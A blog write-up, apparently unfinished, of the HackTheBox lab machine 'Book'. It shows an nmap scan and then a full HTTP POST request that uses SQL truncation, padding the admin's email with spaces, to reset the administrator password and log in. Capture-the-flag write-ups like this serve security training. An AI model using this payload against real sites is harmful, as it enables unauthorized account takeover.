Title:HTB: Book
Date: xx-05-2020 10:35
category:security
tags:security, boot2root, HTB, Linux
meta:security, boot2root, HTB, Linux

<img class="align-left" src="/media/2020.xx/book_card.png" alt="Book card" width="262">


This is a writeup about a retired HacktheBox machine:
[Book](https://www.hackthebox.eu/home/machines/profile/230)
This box is classified as a medium machine published on February the 22th 2020
by [MrR3boot](https://www.hackthebox.eu/home/users/profile/13531).
It involves to

<!-- PELICAN_END_SUMMARY -->

# User

## Recon

We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.

    :::text
    # Nmap 7.80 scan initiated Tue Feb 25 07:26:24 2020 as: nmap --top-ports=10000 -sS -oN nmap 10.10.10.176
    Nmap scan report for 10.10.10.176
    Host is up (0.013s latency).
    Not shown: 8318 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    # Nmap done at Tue Feb 25 07:31:10 2020 -- 1 IP address (1 host up) scanned in 286.11 seconds

## Web

![authentication and signup forms](/media/2020.xx/book_01.png)

We can create an account using on the box.

![User panel](/media/2020.xx/book_02.png)

The Contact form give us the email address of the platform's adminitrator:
`admin@book.htb`.

Using [SQL truncation](https://resources.infosecinstitute.com/sql-truncation-attack)
we can change the admin account password on the plateform.

We register a new user with a specific long email using Burp repeater.
Our post data request is the following:

    POST /index.php HTTP/1.1
    Host: 10.10.10.176
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.10.176/index.php
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 222
    Connection: close
    Cookie: PHPSESSID=9li0llrrcn7tthael9i5s8pmsr
    Upgrade-Insecure-Requests: 1

    name=ppqqe&email=admin%40book.htb%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*&password=q

We can now logged in as `admin@book.htb` using the password `q`.


![admin panel](/media/2020.xx/book_01.png)


